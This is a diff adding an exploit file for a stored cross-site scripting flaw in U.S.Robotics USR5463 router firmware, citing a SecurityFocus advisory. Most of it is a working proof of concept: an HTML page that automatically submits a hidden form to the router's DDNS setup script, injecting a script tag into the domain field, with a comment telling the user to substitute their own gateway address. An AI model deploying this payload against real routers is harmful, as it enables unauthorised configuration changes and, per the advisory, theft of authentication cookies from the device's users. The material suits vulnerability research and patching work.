@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/40292/info
+
+U.S.Robotics USR5463 firmware is prone to an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+U.S.Robotics firmware USR5463 0.06 is vulnerable. 
+
+<!--
+Author: SH4V
+BUG: permanent XSS
+Firmware: USR5463-v0_01.bin - USR5463-v0_06.bin
+Router: USR5463 802.11g Wireless Router
+Company: US Robotics
+Just change http://192.168.2.1/ by your current gateway.
+-->
+<form action="http://192.168.2.1/cgi-bin/setup_ddns.exe" method="post">
+<input type=hidden name="ddns_domainame" value=&#039;"><script>alert(1)</script>&#039;>
+<input type=hidden name="ddns_account" value=&#039;&#039;>
+<input type=password size=1 name="ddns_password" value=&#039;&#039;>
+</form>
+<script>document.forms[0].submit()</script>
